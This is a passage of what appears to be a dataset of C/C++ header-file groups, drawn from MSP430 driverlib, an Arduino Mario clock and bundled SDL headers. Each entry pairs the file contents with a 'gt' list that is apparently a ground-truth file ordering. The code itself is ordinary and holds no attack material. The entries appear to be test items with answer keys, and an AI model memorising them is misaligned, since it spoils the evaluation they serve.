mask);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_disableInterrupt(uint16_t baseAddress,\n\n                                    uint16_t mask);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_enable(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_disable(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t LDOPWR_getInterruptStatus(uint16_t baseAddress,\n\n                                         uint16_t mask);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_clearInterrupt(uint16_t baseAddress,\n\n                                  uint16_t mask);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t LDOPWR_isLDOInputValid(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_enableOverloadAutoOff(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void LDOPWR_disableOverloadAutoOff(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t LDOPWR_getOverloadAutoOffStatus(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\n}\n\n#endif\n\n\n\n#endif\n\n#endif\n\n",
        "gt": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/inc/hw_memmap.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/ldopwr.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/ldopwr.c'"
        ]
    },
    {
        "files": [
            "'mariobros-clock/Locator.h'",
            "'mariobros-clock/Sprite.h'",
            "'mariobros-clock/EventBus.h'",
            "'mariobros-clock/EventTask.h'",
            "'mariobros-clock/mario.h'",
            "'mariobros-clock/Clockface.h'"
        ],
        "content": "'mariobros-clock/Locator.h'\n:#ifndef Locator_h\n#define Locator_h\n\n\n#include <Adafruit_GFX.h>\n#include \"EventBus.h\"\n\nclass Locator {\n  private:\n    static Adafruit_GFX* _display;\n    static EventBus* _eventBus;\n\n  public:\n    static Adafruit_GFX* getDisplay();\n    static EventBus* getEventBus();\n    static void provide(Adafruit_GFX* display);\n    static void provide(EventBus* eventBus);\n};\n\n\n#endif\n'mariobros-clock/Sprite.h'\n:\n#ifndef Sprite_h\n#define Sprite_h\n\n#include <Arduino.h>\n\nclass Sprite {\n\n  protected:\n    uint8_t _x;\n    uint8_t _y;\n    uint8_t _width;\n    uint8_t _height;\n\n  public:\n    boolean collidedWith(Sprite* sprite);\n    void logPosition();\n\n    virtual const char* name();\n};\n\n\n#endif\n\n'mariobros-clock/EventBus.h'\n:\n#ifndef EventBus_h\n#define EventBus_h\n\n#include <Arduino.h>\n#include \"EventTask.h\"\n#include \"Sprite.h\"\n\nclass EventBus {\n  private:\n    EventTask* _subscriptions[5];\n    uint8_t _subNum = 0;\n\n  public:\n    void broadcast(EventType event, Sprite* sender);\n    void subscribe(EventTask* task);\n\n};\n\n\n#endif\n\n'mariobros-clock/EventTask.h'\n:\n#ifndef EventTask_h\n#define EventTask_h\n\n\n#include \"Sprite.h\"\n\nenum EventType {\n    MOVE,\n    COLLISION\n};\n\nclass EventTask {\n  public:\n    virtual void execute(EventType event, Sprite* caller) = 0;\n};\n\n\n#endif\n\n\n\n\n'mariobros-clock/mario.h'\n:#ifndef Mario_h\n#define Mario_h\n\n\n#include \"Game.h\"\n#include \"Locator.h\"\n#include \"EventBus.h\"\n#include \"assets.h\"\n\n\nconst uint8_t MARIO_PACE = 3;\nconst uint8_t MARIO_JUMP_HEIGHT = 14;\n\n\nclass Mario: public Sprite, public EventTask {\n  private:\n\n    enum State {\n      IDLE,\n      WALKING,\n      JUMPING\n    };\n\n    Direction direction;\n\n    int _lastX;\n    int _lastY;\n\n    const unsigned short* _sprite;\n    unsigned long lastMillis = 0;\n    State _state = IDLE;\n    State _lastState = IDLE;\n\n    void idle();\n\n  public:\n    Mario(int x, int y);\n    void init();\n    void move(Direction dir, int times);\n    void jump();\n    void update();\n    const char* name();\n    void execute(EventType event, Sprite* caller);\n\n};\n\n\n#endif\n'mariobros-clock/Clockface.h'\n:#ifndef MarioClockface_h\n#define MarioClockface_h\n\n#include \"Super_Mario_Bros__24pt7b.h\"\n\n#include <Adafruit_GFX.h>\n#include \"Tile.h\"\n#include \"Locator.h\"\n#include \"Game.h\"\n#include \"Object.h\"\n\n#include \"IClockface.h\"\n#include \"CWDateTime.h\"\n\n#include \"assets.h\"\n#include \"mario.h\"\n#include \"block.h\"\n\nclass Clockface: public IClockface {\n  private:\n    Adafruit_GFX* _display;\n    CWDateTime* _dateTime;\n    void updateTime();\n\n  public:\n    Clockface(Adafruit_GFX* display);\n    void setup(CWDateTime *dateTime);\n    void update();\n    void externalEvent(int type);\n};\n\n#endif\n",
        "gt": [
            "'mariobros-clock/Sprite.h'",
            "'mariobros-clock/EventTask.h'",
            "'mariobros-clock/EventBus.h'",
            "'mariobros-clock/Locator.h'",
            "'mariobros-clock/mario.h'",
            "'mariobros-clock/Clockface.h'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_filesystem.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_filesystem.h'\n:\n\n\n\n#ifndef _SDL_filesystem_h\n#define _SDL_filesystem_h\n\n#include \"SDL_stdinc.h\"\n\n#include \"begin_code.h\"\n\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nextern DECLSPEC char *SDLCALL SDL_GetBasePath(void);\n\n\nextern DECLSPEC char *SDLCALL SDL_GetPrefPath(const char *org, const char *app);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_images_h\n#define _SDL_test_images_h\n\n#include \"SDL.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDLTest_SurfaceImage_s {\n  int width;\n  int height;\n  unsigned int bytes_per_pixel;\n  const char *pixel_data;\n} SDLTest_SurfaceImage_t;\n\n\nSDL_Surface *SDLTest_ImageBlit();\nSDL_Surface *SDLTest_ImageBlitColor();\nSDL_Surface *SDLTest_ImageBlitAlpha();\nSDL_Surface *SDLTest_ImageBlitBlendAdd();\nSDL_Surface *SDLTest_ImageBlitBlend();\nSDL_Surface *SDLTest_ImageBlitBlendMod();\nSDL_Surface *SDLTest_ImageBlitBlendNone();\nSDL_Surface *SDLTest_ImageBlitBlendAll();\nSDL_Surface *SDLTest_ImageFace();\nSDL_Surface *SDLTest_ImagePrimitives();\nSDL_Surface *SDLTest_ImagePrimitivesBlend();\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_filesystem.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_thread.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_compare_h\n#define _SDL_test_compare_h\n\n#include \"SDL.h\"\n\n#include \"SDL_test_images.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nint SDLTest_CompareSurfaces(SDL_Surface *surface, SDL_Surface *referenceSurface, int allowable_error);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_thread.h'\n:\n\n#ifndef _SDL_thread_h\n#define _SDL_thread_h\n\n\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_error.h\"\n\n\n#include \"SDL_atomic.h\"\n#include \"SDL_mutex.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nstruct SDL_Thread;\ntypedef struct SDL_Thread SDL_Thread;\n\n\ntypedef unsigned long SDL_threadID;\n\n\ntypedef unsigned int SDL_TLSID;\n\n\ntypedef enum {\n    SDL_THREAD_PRIORITY_LOW,\n    SDL_THREAD_PRIORITY_NORMAL,\n    SDL_THREAD_PRIORITY_HIGH\n} SDL_ThreadPriority;\n\n\ntypedef int (SDLCALL * SDL_ThreadFunction) (void *data);\n\n#if defined(__WIN32__) && !defined(HAVE_LIBC)\n\n#define SDL_PASSED_BEGINTHREAD_ENDTHREAD\n#include <process.h>\n\ntypedef uintptr_t(__cdecl * pfnSDL_CurrentBeginThread) (void *, unsigned,\n                                                        unsigned (__stdcall *\n                                                                  func) (void\n                                                                         *),\n                                                        void *arg, unsigned,\n                                                        unsigned *threadID);\ntypedef void (__cdecl * pfnSDL_CurrentEndThread) (unsigned code);\n\n\nextern DECLSPEC SDL_Thread *SDLCALL\nSDL_CreateThread(SDL_ThreadFunction fn, const char *name, void *data,\n                 pfnSDL_CurrentBeginThread pfnBeginThread,\n                 pfnSDL_CurrentEndThread pfnEndThread);\n\n\n#if defined(SDL_CreateThread) && SDL_DYNAMIC_API\n#undef SDL_CreateThread\n#define SDL_CreateThread(fn, name, data) SDL_CreateThread_REAL(fn, name, data, (pfnSDL_CurrentBeginThread)_beginthreadex, (pfnSDL_CurrentEndThread)_endthreadex)\n#else\n#define SDL_CreateThread(fn, name, data) SDL_CreateThread(fn, name, data, (pfnSDL_CurrentBeginThread)_beginthreadex, (pfnSDL_CurrentEndThread)_endthreadex)\n#endif\n\n#else\n\n\nextern DECLSPEC SDL_Thread *SDLCALL\nSDL_CreateThread(SDL_ThreadFunction fn, const char *name, void *data);\n\n#endif\n\n\nextern DECLSPEC const char *SDLCALL SDL_GetThreadName(SDL_Thread *thread);\n\n\nextern DECLSPEC SDL_threadID SDLCALL SDL_ThreadID(void);\n\n\nextern DECLSPEC SDL_threadID SDLCALL SDL_GetThreadID(SDL_Thread * thread);\n\n\nextern DECLSPEC int SDLCALL SDL_SetThreadPriority(SDL_ThreadPriority priority);\n\n\nextern DECLSPEC void SDLCALL SDL_WaitThread(SDL_Thread * thread, int *status);\n\n\nextern DECLSPEC void SDLCALL SDL_DetachThread(SDL_Thread * thread);\n\n\nextern DECLSPEC SDL_TLSID SDLCALL SDL_TLSCreate(void);\n\n\nextern DECLSPEC void * SDLCALL SDL_TLSGet(SDL_TLSID id);\n\n\nextern DECLSPEC int SDLCALL SDL_TLSSet(SDL_TLSID id, const void *value, void (*destructor)(void*));\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_thread.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_cpuinfo.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_compare_h\n#define _SDL_test_compare_h\n\n#include \"SDL.h\"\n\n#include \"SDL_test_images.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nint SDLTest_CompareSurfaces(SDL_Surface *surface, SDL_Surface *referenceSurface, int allowable_error);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_cpuinfo.h'\n:\n\n\n\n#ifndef _SDL_cpuinfo_h\n#define _SDL_cpuinfo_h\n\n#include \"SDL_stdinc.h\"\n\n\n\n#if defined(_MSC_VER) && (_MSC_VER >= 1500) && (defined(_M_IX86) || defined(_M_X64))\n#include <intrin.h>\n#ifndef _WIN64\n#define __MMX__\n#define __3dNOW__\n#endif\n#define __SSE__\n#define __SSE2__\n#elif defined(__MINGW64_VERSION_MAJOR)\n#include <intrin.h>\n#else\n#ifdef __ALTIVEC__\n#if HAVE_ALTIVEC_H && !defined(__APPLE_ALTIVEC__)\n#include <altivec.h>\n#undef pixel\n#endif\n#endif\n#ifdef __MMX__\n#include <mmintrin.h>\n#endif\n#ifdef __3dNOW__\n#include <mm3dnow.h>\n#endif\n#ifdef __SSE__\n#include <xmmintrin.h>\n#endif\n#ifdef __SSE2__\n#include <emmintrin.h>\n#endif\n#endif\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n#define SDL_CACHELINE_SIZE  128\n\n\nextern DECLSPEC int SDLCALL SDL_GetCPUCount(void);\n\n\nextern DECLSPEC int SDLCALL SDL_GetCPUCacheLineSize(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasRDTSC(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasAltiVec(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasMMX(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_Has3DNow(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasSSE(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasSSE2(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasSSE3(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasSSE41(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasSSE42(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasAVX(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasAVX2(void);\n\n\nextern DECLSPEC int SDLCALL SDL_GetSystemRAM(void);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_images_h\n#define _SDL_test_images_h\n\n#include \"SDL.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDLTest_SurfaceImage_s {\n  int width;\n  int height;\n  unsigned int bytes_per_pixel;\n  const char *pixel_data;\n} SDLTest_SurfaceImage_t;\n\n\nSDL_Surface *SDLTest_ImageBlit();\nSDL_Surface *SDLTest_ImageBlitColor();\nSDL_Surface *SDLTest_ImageBlitAlpha();\nSDL_Surface *SDLTest_ImageBlitBlendAdd();\nSDL_Surface *SDLTest_ImageBlitBlend();\nSDL_Surface *SDLTest_ImageBlitBlendMod();\nSDL_Surface *SDLTest_ImageBlitBlendNone();\nSDL_Surface *SDLTest_ImageBlitBlendAll();\nSDL_Surface *SDLTest_ImageFace();\nSDL_Surface *SDLTest_ImagePrimitives();\nSDL_Surface *SDLTest_ImagePrimitivesBlend();\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_cpuinfo.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_mutex.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_mutex.h'\n:\n\n#ifndef _SDL_mutex_h\n#define _SDL_mutex_h\n\n\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_error.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n#define SDL_MUTEX_TIMEDOUT  1\n\n\n#define SDL_MUTEX_MAXWAIT   (~(Uint32)0)\n\n\n\n\n\n\nstruct SDL_mutex;\ntypedef 